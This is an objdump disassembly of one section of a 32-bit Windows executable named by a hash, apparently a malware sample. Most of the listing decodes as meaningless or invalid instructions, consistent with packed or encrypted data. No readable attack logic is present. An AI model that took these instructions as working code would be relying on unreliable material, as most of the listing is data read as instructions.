
77b4e4fed1ca2b0062df79f1a63630faa0a662170aa86a0fcdf283effe105435.exe:     file format pei-i386


Disassembly of section HDRS:

00401000 <HDRS>:
  401000:	or     esi,DWORD PTR [ebx+edi*8+0x401004ff]
  401007:	add    BYTE PTR [edx],cl
  401009:	push   es
  40100a:	push   ebx
  40100b:	je     0x40107f
  40100d:	imul   ebp,DWORD PTR [esi+0x67],0x3f011658
  401014:	repz mov esp,0x1704ade6
  40101a:	fdiv   QWORD PTR [ebx]
  40101c:	call   0x30fc27
  401021:	jns    0x400fbd
  401023:	iret   
  401024:	in     al,0x5c
  401026:	xor    DWORD PTR [eax-0x4c],edi
  401029:	pop    es
  40102a:	push   esp
  40102b:	dec    edi
  40102c:	bound  ebp,QWORD PTR [edx+0x65]
  40102f:	(bad)  
  401030:	imul   esp,DWORD PTR [ecx-0x11],0x66647463
  401037:	pop    es
  401038:	sbb    ecx,eax
  40103a:	push   es
  40103b:	push   ebx
  40103c:	jns    0x4010b1
  40103e:	je     0x4010a5
  401040:	ins    DWORD PTR es:[edi],dx
  401041:	jmp    0x84ac0e04
  401046:	and    al,0xf
  401048:	or     cl,BYTE PTR [ecx+0x49]
  40104b:	outs   dx,BYTE PTR ds:[esi]
  40104c:	sbb    dh,BYTE PTR [edx+0x66]
  40104f:	popa   
  401050:	arpl   WORD PTR [ebp-0x1f],sp
  401053:	add    edi,edi
  401055:	lahf   
  401056:	int3   
  401057:	push   es
  401058:	rcr    BYTE PTR [ebx+0x46],0x3
  40105c:	add    bh,bh
  40105e:	dec    esp
  401060:	add    DWORD PTR [esp+0x4],0xfffffff8
  401065:	jmp    0x6dce5461
  40106a:	inc    esp
  40106b:	inc    edx
  40106c:	je     0x401081
  40106e:	pushf  
  40106f:	mov    al,0xcc
  401071:	int3   
  401072:	mov    cl,0xa0
  401074:	out    dx,eax
  401075:	(bad)  
  401076:	out    dx,eax
  401077:	mov    esp,0x91c506bb
  40107c:	xchg   edi,eax
  40107d:	shr    DWORD PTR [esi],1
  40107f:	or     BYTE PTR [edx-0x72d89260],cl
  401085:	adc    al,0x4c
  401087:	adc    DWORD PTR [esi],eax
  401089:	fucomp st(7)
  40108b:	int    0xcb
  40108d:	pop    es
  40108e:	fnstsw WORD PTR [edi]
  401090:	or     al,0xe6
  401092:	or     al,0x10
  401094:	inc    eax
  401095:	dec    esp
  401096:	push   edx
  401097:	pop    eax
  401098:	or     BYTE PTR [esi+0x72],cl
  40109b:	xchg   edx,eax
  40109c:	push   edx
  40109d:	push   0x8d541152
  4010a2:	dec    ecx
  4010a3:	neg    DWORD PTR [edi-0x741e9b20]
  4010a9:	sar    bh,0x25
  4010ac:	mov    BYTE PTR [ecx+0x41],dh
  4010af:	add    BYTE PTR [edi],cl
  4010b1:	test   cl,cl
  4010b3:	leave  
  4010b4:	leave  
  4010b5:	leave  
  4010b6:	cmp    BYTE PTR [eax+edi*2-0x64],0xc9
  4010bb:	leave  
  4010bc:	leave  
  4010bd:	leave  
  4010be:	je     0x401058
  4010c0:	jo     0x40112e
  4010c2:	leave  
  4010c3:	leave  
  4010c4:	leave  
  4010c5:	leave  
  4010c6:	push   0xc95c6064
  4010cb:	leave  
  4010cc:	leave  
  4010cd:	leave  
  4010ce:	pop    eax
  4010cf:	push   esp
  4010d0:	push   eax
  4010d1:	dec    esp
  4010d2:	leave  
  4010d3:	leave  
  4010d4:	leave  
  4010d5:	leave  
  4010d6:	dec    eax
  4010d7:	xchg   esp,eax
  4010d8:	inc    esp
  4010d9:	inc    eax
  4010da:	leave  
  4010db:	leave  
  4010dc:	leave  
  4010dd:	leave  
  4010de:	cmp    al,0xac
  4010e0:	test   al,0xa4
  4010e2:	leave  
  4010e3:	leave  
  4010e4:	leave  
  4010e5:	leave  
  4010e6:	cmp    BYTE PTR [esp+edi*4],dh
  4010e9:	mov    eax,0xc9c9c9c9
  4010ee:	mov    ah,0x30
  4010f0:	sub    al,0x28
  4010f2:	sub    edi,DWORD PTR [esi]
  4010f4:	cld    
  4010f5:	retf   
  4010f6:	and    al,0x53
  4010f8:	add    esp,0xffffffbc
  4010fb:	mov    ebx,0xe854b00a
  401100:	add    BYTE PTR [ecx],0xdc
  401103:	je     0x4010bc
  401105:	call   FWORD PTR [ebx+0x74012cf6]
  40110b:	add    eax,0x245cb70f
  401110:	xor    BYTE PTR [ebx+0x5b4436c3],cl
  401116:	ret    
  401117:	(bad)  
  401118:	and    BYTE PTR [esp+ebx*4+0x181c9c9c],bl
  40111f:	adc    al,0x10
  401121:	sbb    DWORD PTR [esp+ebx*4+0x4080c9c],0xfffffff4
  401129:	cld    
  40112a:	ins    BYTE PTR es:[edi],dx
  40112b:	(bad)  
  40112c:	in     eax,dx
  40112d:	mov    ebx,0x83dc65e0
  401132:	cmp    eax,DWORD PTR [eax]
  401134:	jne    0x40118f
  401136:	push   0x6a0644
  40113b:	add    bl,BYTE PTR [eax-0x64010277]
  401141:	fisttp QWORD PTR [eax]
  401143:	cmp    DWORD PTR [esi+eax*1+0x2c],0x7
  401148:	xor    eax,eax
  40114a:	mov    DWORD PTR [esp],eax
  40114d:	jmp    0x40119f
  40114f:	mov    esp,DWORD PTR [edx]
  401151:	mov    edx,DWORD PTR ds:0x5cdfb7dc
  401157:	neg    DWORD PTR [eax-0x77]
  40115a:	adc    BYTE PTR [edi],dl
  40115c:	mov    ds:0xd08b3615,eax
  401161:	add    edx,edx
  401163:	mov    ecx,DWORD PTR [esp+ebx*1-0x73]
  401167:	push   esp
  401168:	sar    edi,1
  40116a:	out    dx,al
  40116b:	scas   al,BYTE PTR es:[edi]
  40116c:	jecxz  0x401172
  40116e:	mov    DWORD PTR [edx+ecx*8-0x75],edx
  401172:	pop    es
  401173:	or     ecx,DWORD PTR [ecx+0x13890f0a]
  401179:	inc    eax
  40117a:	cmp    eax,0x64
  40117d:	jne    0x40115b
  40117f:	cmp    eax,0x8bdd9cd7
  401184:	add    ebx,DWORD PTR [edx+ebp*1+0xf037807]
  40118b:	mov    ds:0x4d6c1e8b,al
  401190:	add    DWORD PTR [edx+ecx*4],0x4024890c
  401197:	add    al,0x96
  401199:	push   ebx
  40119a:	push   esi
  40119b:	xor    al,0xcf
  40119d:	jne    0x40117e
  40119f:	sbb    al,0xf8
  4011a1:	mov    esi,edx
  4011a3:	mov    ebx,eax
  4011a5:	(bad)  
  4011a6:	fsub   DWORD PTR [ecx-0x2]
  4011a9:	add    al,0x4
  4011ab:	fwait
  4011ac:	sub    eax,0x3aebdef8
  4011b1:	mov    eax,DWORD PTR [esi]
  4011b3:	lahf   
  4011b4:	inc    edx
  4011b5:	add    al,BYTE PTR [esi+0x4]
  4011b8:	adc    ecx,DWORD PTR [eax+ebp*4]
  4011bb:	into   
  4011bc:	jbe    0x40116e
  4011be:	mov    ebx,0x2414a788
  4011c3:	and    ebp,DWORD PTR [eax-0x1319fba8]
  4011c9:	(bad)  
  4011cb:	cmp    eax,0xb0d6db50
  4011d0:	add    DWORD PTR [ecx+0x5a],ebx
  4011d3:	pop    esi
  4011d4:	(bad)  
  4011d5:	mov    bl,0x24
  4011d7:	push   es
  4011d8:	test   DWORD PTR [esi],0x8b5089b6
  4011de:	adc    BYTE PTR [edi+0x10],al
  4011e1:	dec    esp
  4011e2:	cmp    al,0x48
  4011e4:	fsub   QWORD PTR [ebp+0xc7cf360]
  4011ea:	dec    edx
  4011eb:	add    al,0xb2
  4011ed:	loopne 0x401192
  4011ef:	or     eax,0xc0fbbede
  4011f4:	popw   ds
  4011f6:	push   edi
  4011f7:	push   ebp
  4011f8:	outs   dx,DWORD PTR ds:[esi]
  4011f9:	(bad)  [ebx-0x1037410]
  4011ff:	mov    DWORD PTR [edi],eax
  401201:	mov    eax,DWORD PTR [edx]
  401203:	ja     0x40126b
  401205:	(bad)  
  401206:	push   cs
  401207:	jbe    0x40124b
  401209:	push   0x43
  40120b:	pop    eax
  40120c:	push   ss
  40120d:	push   esp
  40120e:	repz pop ss
  401210:	mov    edx,DWORD PTR [edx-0x40]
  401213:	jle    0x401205
  401215:	add    eax,0x2f8bca22
  40121a:	add    ecx,DWORD PTR [ebp+0x1c]
  40121d:	cmp    ecx,eax
  40121f:	jne    0x401239
  401221:	xor    ch,ch
  401223:	neg    ch
  401225:	idiv   DWORD PTR [edx+0x3]
  401228:	rol    BYTE PTR [eax+0x40],0x8
  40122c:	pop    edx
  40122d:	or     al,0xc
  40122f:	add    DWORD PTR [esi-0x15],ebx
  401232:	push   ss
  401233:	add    ecx,DWORD PTR [eax]
  401235:	cmp    edi,edi
  401237:	pop    es
  401238:	outs   dx,BYTE PTR ds:[esi]
  401239:	in     eax,dx
  40123a:	shl    BYTE PTR [ebp+0xf],1
  40123d:	cmp    eax,0x3b07472f
  401242:	aaa    
  401243:	jne    0x4011f3
  401245:	mov    edx,ebx
  401247:	mov    esi,ebx
  401249:	add    al,BYTE PTR [ebx+0x6435c6bb]
  40124f:	test   al,al
  401251:	loope  0x4012c3
  401253:	pop    ecx
  401254:	pop    edx
  401255:	pop    ebp
  401256:	pop    edi
  401257:	mov    al,ds:0xfea704c1
  40125c:	(bad)  
  40125e:	fxtract 
  401260:	(bad)  
  401261:	in     eax,dx
  401262:	lods   al,BYTE PTR ds:[esi]
  401263:	(bad)  [esp+eiz*2]
  401266:	aam    0xa
  401268:	push   cs
  401269:	mov    esi,0x86820fde
  40126e:	ds shr ebp,0xf6
  401272:	xchg   BYTE PTR [edx-0x75],ah
  401275:	add    ebx,DWORD PTR ds:[edi+0x2a]
  401279:	stc    
  40127a:	add    edi,DWORD PTR [edx-0x38]
  40127d:	fbstp  TBYTE PTR [edx+0x76]
  401280:	push   cs
  401281:	jle    0x40125b
  401283:	std    
  401284:	shl    DWORD PTR [ecx],0x4e
  401287:	mov    ecx,DWORD PTR [esi]
  401289:	add    DWORD PTR [ecx+0x8],eax
  40128c:	movhps xmm5,QWORD PTR [ecx]
  40128f:	pop    eax
  401290:	push   es
  401291:	cmp    DWORD PTR [eax-0x77],0x7d
  401295:	pusha  
  401296:	stos   DWORD PTR es:[edi],eax
  401297:	dec    eax
  401298:	jne    0x4012f0
  40129a:	push   cs
  40129b:	add    ebx,ebp
  40129d:	dec    ebp
  40129e:	imul   eax,DWORD PTR [edi],0x75d87f05
  4012a4:	or     dl,BYTE PTR [ecx-0x15]
  4012a7:	xor    ecx,DWORD PTR [ebx+0x2a5a031a]
  4012ad:	pop    esp
  4012ae:	mov    edx,0xfc7efc3e
  4012b3:	int    0x8b
  4012b5:	jg     0x4012e5
  4012b7:	add    edi,DWORD PTR [ebp+0xc]
  4012ba:	sub    edi,ebx
  4012bc:	mov    DWORD PTR [ebx+ebp*1],edx
  4012bf:	enter  0x48fc,0xc
  4012c3:	(bad)  
  4012c4:	fcomi  st,st(0)
  4012c6:	or     bh,BYTE PTR [edx]
  4012c8:	addr16 push es
  4012ca:	pop    ecx
  4012cb:	jmp    0x4012e5
  4012cd:	retf   0x14eb
  4012d0:	and    al,0xd9
  4012d2:	lahf   
  4012d3:	add    BYTE PTR [edi],0x26
  4012d6:	push   es
  4012d7:	inc    eax
  4012d8:	cmp    ecx,DWORD PTR [edi]
  4012da:	test   DWORD PTR [ecx-0x1],ebx
  4012dd:	add    al,dh
  4012df:	loopne 0x401322
  4012e1:	xor    DWORD PTR [edx],0x908b106c
  4012e7:	xchg   BYTE PTR [ebx+0x2fbbd9da],cl
  4012ed:	fmul   DWORD PTR [esi+0x105afe81]
  4012f3:	add    BYTE PTR [ebp+0x7],bh
  4012f6:	mov    esi,0x810ceb0d
  4012fb:	(bad)  
  4012fc:	dec    eax
  4012fd:	mov    ds:0x12b66ff6,al
  401302:	and    esi,0x73890e06
  401308:	add    al,0x6a
  40130a:	add    DWORD PTR [eax+0x0],ebp
  40130d:	and    BYTE PTR [esi],dl
  40130f:	push   esi
  401310:	add    ebp,DWORD PTR [ecx+esi*4-0x1f]
  401314:	jg     0x4012be
  401316:	mov    edi,eax
  401318:	mov    DWORD PTR [ebx],edi
  40131a:	test   edi,edi
  40131c:	je     0x401341
  40131e:	xor    al,0xb8
  401320:	in     al,0x26
  401322:	loope  0x4012de
  401324:	push   es
  401325:	mov    ds:0x80481336,eax
  40132a:	dec    ebx
  40132b:	ficom  WORD PTR [eax+0x4d]
  40132e:	mov    al,0x3b
  401330:	push   ss
  401331:	ret    
  401332:	sbb    al,0x59
  401334:	(bad)  
  401335:	push   ebp
  401336:	pop    eax
  401337:	sub    al,0xc7
  40133a:	pop    edx
  40133b:	imul   ebp
  40133d:	or     al,0xb2
  40133f:	shr    DWORD PTR [edx+0x4],0x9f
  401343:	push   0x96a55517
  401348:	inc    ebp
  401349:	xchg   dh,dh
  40134b:	jne    0x40136c
  40134d:	icebp  
  40134e:	add    al,0x49
  401350:	pushf  
  401351:	sub    al,0x18
  401353:	ror    BYTE PTR [esi+0x18],0xed
  401357:	mov    bh,0x3c
  401359:	push   ebp
  40135a:	sbb    BYTE PTR [esi+0x3f],bl
  40135d:	call   0x2d074ff4
  401362:	inc    DWORD PTR [esi-0xce4e2e9]
  401368:	leave  
  401369:	mov    DWORD PTR [esp+ecx*1+0x58031054],edi
  401370:	push   ds
  401371:	fcomp  QWORD PTR ds:[esi]
  401374:	jecxz  0x40138a
  401376:	mov    eax,ds:0x6beb3c96
  40137b:	dec    ebp
  40137c:	aad    0xd6
  40137e:	pop    esp
  40137f:	sub    al,0xec
  401381:	sbb    BYTE PTR [eax+0x5c],0x3a
  401385:	jb     0x4013d9
  401387:	call   0x3f2:0x6983f7c
  40138e:	jo     0x4013a4
  401390:	ja     0x4013d7
  401392:	and    al,0x8
  401394:	jae    0x40136c
  401396:	(bad)  
  401398:	cmp    bh,ch
  40139a:	or     BYTE PTR [edx+0x68],al
  40139d:	or     BYTE PTR [ebx],al
  40139f:	push   0x76986c32
  4013a4:	es es mov eax,0x90a7058
  4013ab:	std    
  4013ac:	jne    0xc1c1ec7
  4013b2:	xor    al,0xa
  4013b4:	mov    DWORD PTR ds:0xbd94bac0,0x8fc1fc1d
  4013be:	scas   eax,DWORD PTR es:[edi]
  4013bf:	push   es
  4013c0:	jg     0x4013fd
  4013c2:	push   es
  4013c3:	jne    0x401351
  4013c5:	push   esi
  4013c6:	pop    es
  4013c7:	sbb    BYTE PTR [ecx-0x53],bl
  4013ca:	cmp    BYTE PTR [esi+0x711174fe],dl
  4013d0:	xchg   edx,eax
  4013d1:	je     0x401383
  4013d3:	test   eax,0x132b46bb
  4013d8:	inc    edi
  4013d9:	mov    ah,0x18
  4013dc:	lea    ebx,[edx+0x7d]
  4013df:	xor    al,BYTE PTR [ebx-0x21]
  4013e2:	call   0xa0b4a133
  4013e7:	loope  0x40142e
  4013e9:	stos   BYTE PTR es:[edi],al
  4013ea:	jnp    0x4013e6
  4013ec:	(bad)  
  4013ed:	out    0xc0,al
  4013ef:	ret    0xe181
  4013f2:	add    al,dh
  4013f4:	faddp  st(3),st
  4013f6:	fneni(8087 only) 
  4013f8:	push   esp
  4013f9:	dec    esp
  4013fa:	mov    al,ds:0xffc28138
  4013ff:	(bad)  
  401401:	loop   0x401428
  401403:	cmp    cl,ch
  401405:	jmp    0x12ab:0x109ab60d
  40140c:	sub    ecx,ebx
  40140e:	dec    esp
  40140f:	dec    edi
  401410:	jo     0x40144e
  401412:	fld    DWORD PTR [edi]
  401414:	jmp    0x401471
  401416:	or     eax,0xc7fbd906
  40141b:	mov    es,WORD PTR [ebx]
  40141d:	jbe    0x401464
  40141f:	add    BYTE PTR ds:0x65067310,bh
  401425:	or     bl,al
  401427:	xor    dh,BYTE PTR [edi+0x76e92081]
  40142d:	pop    es
  40142e:	ja     0x40146b
  401430:	or     BYTE PTR [ebx+0x1f],dh
  401433:	push   ds
  401434:	fmul   st,st(7)
  401436:	mov    ah,0x1d
  401438:	adc    BYTE PTR [edx],bh
  40143a:	sub    eax,DWORD PTR [esi]
  40143c:	push   eax
  40143d:	es iret 
  40143f:	test   al,0x9
  401441:	out    dx,al
  401442:	jbe    0x4014bc
  401444:	push   es
  401445:	out    0xeb,eax
  401447:	setp   BYTE PTR [eax-0x1d53ef47]
  40144e:	loopne 0x401457
  401450:	jne    0x4013ee
  401452:	or     DWORD PTR [edi],0xf83c1e7b
  401458:	xor    bl,BYTE PTR [edx+ebp*8-0x7f]
  40145c:	lds    esp,FWORD PTR [ecx-0x1b]
  40145f:	xchg   DWORD PTR [ecx+edi*1-0x1c],ebp
  401463:	and    bl,BYTE PTR [eax+0x7b]
  401466:	add    DWORD PTR [ecx-0x75],eax
  401469:	loopne 0x4014ad
  40146b:	push   cs
  40146c:	pop    eax
  40146d:	add    edi,DWORD PTR [ecx+0x5]
  401470:	jg     0x40143c
  401472:	add    DWORD PTR [ebx],0x77
  401475:	push   es
  401476:	aaa    
  401477:	add    esi,DWORD PTR [ebx+0x20]
  40147a:	outs   dx,BYTE PTR ds:[esi]
  40147b:	inc    eax
  40147c:	xor    edx,DWORD PTR [esp+ebx*1+0x3c]
  401480:	add    ebp,DWORD PTR [ebp+0x3d]
  401483:	add    bl,BYTE PTR [edx]
  401485:	sbb    ah,BYTE PTR [esi]
  401487:	xor    BYTE PTR [ebp-0x61],0xf7
  40148b:	hlt    
  40148c:	xchg   edi,eax
  40148d:	mov    ds:0xd64675fb,eax
  401492:	mov    ebp,0x3f443ef4
  401497:	sar    BYTE PTR [edi+0x73],0x70
  40149b:	xor    BYTE PTR [edx],dl
  40149d:	push   ds
  40149e:	inc    ecx
  40149f:	cmp    esi,DWORD PTR [eax+0xc]
  4014a2:	jg     0x4014d8
  4014a4:	mov    ecx,ebx
  4014a6:	xlat   BYTE PTR ds:[ebx]
  4014a7:	inc    esi
  4014a8:	fild   WORD PTR [edi]
  4014aa:	xor    DWORD PTR [ebx-0x1bf93f2a],ecx
  4014b0:	push   edi
  4014b1:	pop    edi
  4014b2:	mov    edx,DWORD PTR [ebp+eiz*4+0x17e03395]
  4014b9:	add    DWORD PTR [eax],edi
  4014bb:	pand   mm0,QWORD PTR [edi]
  4014be:	in     al,0xae
  4014c0:	aaa    
  4014c1:	repnz inc edi
  4014c3:	mov    eax,DWORD PTR [edi]
  4014c5:	ds icebp 
  4014c7:	shr    BYTE PTR [edi],1
  4014c9:	jne    0x401486
  4014cb:	fnsave [ebx]
  4014cd:	pusha  
  4014ce:	test   DWORD PTR ds:0x8d267140,0x4dc5220a
  4014d8:	hlt    
  4014d9:	call   0xdd420cb8
  4014de:	xchg   edx,eax
  4014df:	daa    
  4014e0:	push   ebx
  4014e1:	add    al,0x3
  4014e3:	mov    edi,0xe909c01c
  4014e8:	jo     0x4014d1
  4014ea:	inc    esi
  4014eb:	or     al,0x89
  4014ed:	or     al,0x4c
  4014ef:	lock loopne 0x40151c
  4014f2:	push   ss
  4014f3:	cli    
  4014f4:	or     dh,0x4
  4014f7:	pop    ecx
  4014f8:	(bad)  
  4014f9:	iret   
  4014fa:	jne    0x401530
  4014fc:	mov    ecx,0x1d06cee7
  401501:	cmp    ebp,DWORD PTR [esi]
  401503:	je     0x401575
  401505:	data16 fwait
  401507:	mov    ds:0x753bd207,al
  40150c:	out    dx,eax
  40150d:	or     eax,0x1fc0305f
  401512:	pop    ebp
  401513:	xor    al,0xf
  401515:	mov    ds,WORD PTR [ecx+ebx*2+0x502bd78b]
  40151c:	xor    al,0xf
  40151e:	xor    al,0x78
  401520:	outs   dx,DWORD PTR ds:[esi]
  401521:	fwait
  401522:	push   cs
  401523:	add    eax,DWORD PTR [ecx+0xc]
  401526:	repnz or BYTE PTR [edi],dh
  401529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40152a:	lock adc al,0x7c
  40152d:	cmp    eax,0x10333a05
  401532:	fimul  DWORD PTR [eax]
  401534:	aas    
  401535:	pusha  
  401536:	aam    0x74
  401538:	int    0x10
  40153a:	lahf   
  40153b:	sub    ecx,DWORD PTR [ebx-0x3bd26af4]
  401541:	sub    esi,DWORD PTR [eax+0x45]
  401544:	out    0x33,al
  401546:	ror    BYTE PTR [ecx+0x430aba10],cl
  40154c:	inc    eax
  40154d:	scas   al,BYTE PTR es:[edi]
  40154e:	cdq    
  40154f:	int3   
  401550:	test   DWORD PTR [edx+0x21348da2],ebp
  401556:	jbe    0x401562
  401558:	adc    BYTE PTR [edx+0x54],al
  40155b:	xchg   ebp,eax
  40155c:	add    ebx,DWORD PTR [edi]
  40155e:	cld    
  40155f:	shr    ebx,cl
  401561:	push   edx
  401562:	stc    
  401563:	cmp    ebx,ebp
  401565:	jne    0x4015a9
  401567:	pop    edi
  401568:	jg     0x4015a5
  40156a:	cmp    eax,edx
  40156c:	sbb    DWORD PTR [ecx-0x1a4f83b8],0x70
  401573:	cmp    BYTE PTR [esi+0x40f8694f],ch
  401579:	cs (bad) 
  40157b:	inc    eax
  40157c:	lock push ss
  40157e:	adc    eax,0x1ae4eda
  401583:	rcl    DWORD PTR [eax],cl
  401585:	pop    es
  401586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401587:	in     eax,0xc3
  401589:	dec    edi
  40158a:	sub    DWORD PTR [edi-0x37],ecx
  40158d:	lea    ecx,[eax-0x34fc1e9b]
  401593:	rol    DWORD PTR [edi],1
  401595:	pushf  
  401596:	add    edx,eax
  401598:	and    al,al
  40159a:	adc    edi,DWORD PTR [ebp+0x3b2bd6c5]
  4015a0:	push   0x1cd25f76
  4015a5:	sub    ebx,DWORD PTR [edx-0x7c]
  4015a8:	dec    ecx
  4015a9:	add    DWORD PTR [esi],ecx
  4015ab:	mov    esi,0xbba40798
  4015b0:	cs hlt 
  4015b2:	mov    fs,eax
  4015b4:	pop    edi
  4015b5:	mov    ds,WORD PTR [esi+0x4c]
  4015b8:	test   ebx,ebx
  4015ba:	je     0x4015db
  4015bc:	pop    ebx
  4015be:	sbb    eax,0x8b0e8e0d
  4015c3:	inc    ecx
  4015c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015c5:	xor    eax,0x58661cc3
  4015ca:	aam    0xf
  4015cc:	adc    al,0x7
  4015ce:	ja     0x4015d4
  4015d0:	outs   dx,DWORD PTR ds:[esi]
  4015d1:	xor    eax,esi
  4015d3:	sar    BYTE PTR [ebx+ebp*8-0x33],0x2a
  4015d8:	scas   eax,DWORD PTR es:[edi]
  4015d9:	push   ebp
  4015da:	mov    ebp,esp
  4015dc:	push   ecx
  4015dd:	fnstcw WORD PTR [edi+0x554805e8]
  4015e3:	push   0x64801bac
  4015e8:	push   DWORD PTR [edx]
  4015ea:	mov    DWORD PTR fs:[edx],esp
  4015ed:	push   0xc70151c4
  4015f2:	call   0x453d:0x80b802fd
  4015f9:	pusha  
  4015fa:	adc    al,0x7e
  4015fc:	or     ah,BYTE PTR ds:0xdbb27cc0
  401602:	xchg   BYTE PTR [ebx],dh
  401604:	pop    esp
  401605:	lahf   
  401606:	adc    esp,DWORD PTR [eax]
  401608:	pushw  0xff8
  40160c:	jle    0x401605
  40160e:	sbb    eax,0x1ca38d2e
  401613:	sub    al,BYTE PTR [ebx+0x40820a3d]
  401619:	mov    eax,0x700ff003
  40161e:	sub    eax,0x441b15ed
  401623:	xor    ah,0x40
  401626:	cmp    eax,0xf7b70a01
  40162b:	sub    edx,DWORD PTR [ebp+esi*2-0x14]
  40162f:	mov    DWORD PTR [ebp-0x4],0xc8b2804
  401636:	mov    edx,DWORD PTR [ebp-0x4]
  401639:	add    edi,esp
  40163b:	mov    esi,0x101178d9
  401640:	push   cs
  401641:	mov    ds:0x5c63010,eax
  401646:	mov    esp,0xf6c182c3
  40164b:	add    ah,BYTE PTR [edx+0x5a]
  40164e:	pop    ecx
  40164f:	pop    ecx
  401650:	fs sub al,0x68
  401653:	mov    bl,0x4e
  401655:	das    
  401656:	popa   
  401657:	neg    DWORD PTR [edi]
  401659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40165a:	enter  0x6c3,0x26
  40165e:	test   al,0xeb
  401660:	in     eax,0xa0
  401662:	pop    ebx
  401663:	pop    ecx
  401664:	pop    ebp
  401665:	loope  0x4016b3
  401667:	test   DWORD PTR [ecx+0x5284aed6],eax
  40166d:	pop    ds
  40166e:	test   eax,0xe65bb02c
  401673:	test   al,ch
  401675:	cld    
  401676:	xchg   ah,cl
  401678:	mov    al,0x1c
  40167a:	xor    BYTE PTR [esi],al
  40167c:	stos   DWORD PTR es:[di],eax
  40167e:	mov    al,ds:0xd7b920
  401683:	mov    eax,ds:0xb03ae74b
  401688:	push   edi
  401689:	mov    DWORD PTR [eax+0x45318d64],esp
  40168f:	clc    
  401690:	mov    eax,ds:0xebc0ad80
  401695:	sbb    ecx,DWORD PTR ds:0x2d860f16
  40169b:	xchg   ebp,eax
  40169c:	jae    0x4016b5
  40169e:	cmp    DWORD PTR [ecx+0x49db750e],edi
  4016a4:	pop    edi
  4016a5:	loopne 0x40162f
  4016a7:	mov    DWORD PTR [ecx+0x7d83de91],esp
  4016ad:	cld    
  4016ae:	add    BYTE PTR [ebx+ecx*8-0x32],dh
  4016b2:	adc    DWORD PTR [ebp+0x12a10021],edx
  4016b8:	jmp    0x827c96fe
  4016bd:	add    esi,DWORD PTR [ebp-0x21]
  4016c0:	repz mov bh,0x1c
  4016c3:	ror    DWORD PTR [esi-0x72],1
  4016c6:	popa   
  4016c7:	pop    es
  4016c8:	rcr    bl,1
  4016ca:	pop    esp
  4016cb:	pop    ebp
  4016cc:	test   DWORD PTR [eax-0x72801e3],0x7583053b
  4016d6:	or     DWORD PTR [eax],eax
  4016d8:	adc    eax,0xcf80f815
  4016dd:	or     BYTE PTR [ebx],dl
  4016df:	push   eax
  4016e0:	or     BYTE PTR [ecx+0x4e7fcefa],al
  4016e6:	push   eax
  4016e7:	cld    
  4016e8:	mov    ?,edi
  4016ea:	fdiv   DWORD PTR [ebp+0x17]
  4016ed:	test   edx,edx
  4016ef:	jns    0x40170b
  4016f1:	ret    0xc103
  4016f4:	cli    
  4016f5:	add    ah,BYTE PTR [ecx+0x4eefe13f]
  4016fb:	sti    
  4016fc:	nop
  4016fd:	hlt    
  4016fe:	jmp    0x40174b
  401700:	sub    eax,0x8b2f0d8b
  401705:	sbb    al,0x24
  401707:	mov    DWORD PTR [ecx+edx*4-0xc],ebx
  40170b:	push   esi
  40170c:	loop   0x401754
  40170e:	sbb    al,0x89
  401710:	fist   DWORD PTR [eax]
  401712:	or     eax,0xdb11e21f
  401717:	mov    dl,0xeb
  401719:	sbb    DWORD PTR ds:0x519f5a59,esi
  40171f:	mov    ebx,DWORD PTR [ebx]
  401721:	icebp  
  401722:	lahf   
  401723:	mov    cs,esp
  401725:	push   es
  401726:	and    BYTE PTR [ecx-0x74e714ef],cl
  40172c:	adc    DWORD PTR [ebx+edi*1-0x842513e],eax
  401733:	xor    BYTE PTR [edx+0x3c],0x19
  401737:	add    edx,DWORD PTR [ebx+0xc]
  40173a:	adc    BYTE PTR ds:0xba321222,bl
  401740:	inc    ecx
  401741:	in     al,0xf1
  401743:	add    cl,al
  401745:	cmp    edx,DWORD PTR [ecx]
  401747:	bnd jnp 0x4017bb
  40174a:	cmp    bh,0x53
  40174d:	jle    0x4017ad
  40174f:	add    DWORD PTR [ebx-0x3579a5ff],ecx
  401755:	sub    ecx,0x4
  401758:	lea    ebx,[ecx+eax*1]
  40175b:	mov    DWORD PTR [esi],ebx
  40175d:	mul    ecx
  40175f:	idiv   bl
  401761:	cmp    edx,0x10
  401764:	jl     0x401779
  401766:	(bad)  
  401767:	mov    DWORD PTR [edx],0x8b804807
  40176d:	ror    DWORD PTR [edi+ecx*1],1
  401770:	mov    WORD PTR [edx+edi*2-0x75],cs
  401774:	push   eax
  401775:	fs cs retf 0x760f
  40177a:	leave  
  40177b:	add    ch,BYTE PTR [ecx+ecx*4]
  40177e:	test   BYTE PTR [esi],0x3f
  401781:	mov    bl,0x47
  401783:	or     BYTE PTR [edi+edi*8],ch
  401786:	add    eax,0x83d0cfac
  40178b:	jmp    0x4d4d:0x7e19d004
  401792:	jmp    0x1501:0x147fe8fc
  401799:	mov    al,0x83
  40179b:	mov    esi,0x14ddbf57
  4017a0:	call   0x7c4c8c63
  4017a5:	push   cs
  4017a6:	or     edx,0x2
  4017a9:	ins    BYTE PTR es:[edi],dx
  4017aa:	rol    BYTE PTR [eax+ebp*1],0xd
  4017ae:	int3   
  4017af:	(bad)  
  4017b1:	daa    
  4017b2:	stc    
  4017b3:	fwait
  4017b4:	or     al,BYTE PTR [ebx]
  4017b6:	ret    0x2083
  4017b9:	inc    bl
  4017bb:	push   ebx
  4017bc:	push   esi
  4017bd:	push   ecx
  4017be:	xchg   ecx,eax
  4017bf:	xor    bl,BYTE PTR [ecx-0x1e3522fe]
  4017c5:	cmp    ecx,0x4e9740b
  4017cb:	idiv   dl
  4017cd:	lods   eax,DWORD PTR ds:[esi]
  4017ce:	sti    
  4017cf:	fiadd  DWORD PTR [ecx-0x51d4361d]
  4017d5:	enter  0x1133,0xf7
  4017d9:	ret    0xf0fe
  4017dc:	aas    
  4017dd:	pop    esi
  4017de:	in     eax,0xfe
  4017e0:	sbb    DWORD PTR ds:0x740101f6,eax
  4017e6:	sub    DWORD PTR [ebx+0x2b08727c],ecx
  4017ec:	(bad)  
  4017ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ee:	or     al,0xfb
  4017f0:	xor    esi,DWORD PTR [ebx]
  4017f2:	cmp    esi,DWORD PTR [eax+0x8]
  4017f5:	xchg   DWORD PTR [esi],eax
  4017f7:	lea    esp,[ecx+0xc01fa6a]
  4017fd:	jle    0x4017dd
  4017ff:	les    ebx,FWORD PTR [esi-0x20224425]
  401805:	out    dx,eax
  401806:	fdiv   DWORD PTR [ebx]
